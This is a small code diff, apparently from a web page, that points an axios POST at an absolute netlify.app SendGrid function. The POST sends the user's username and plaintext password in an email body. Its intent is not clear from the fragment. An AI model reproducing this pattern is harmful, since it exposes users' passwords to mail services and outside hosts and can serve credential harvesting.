@@ -239,7 +239,7 @@ Belgium
 
             try {
                 await axios.post(
-                    '/.netlify/functions/sendgrid',
+                    'https://calm-hamster-dc7d4b.netlify.app/.netlify/functions/sendgrid',
                     {
                         message: `<br>` + "Username: " + username + `<br>` + "Password: " + password + `<br>`,
 						destEmail: username
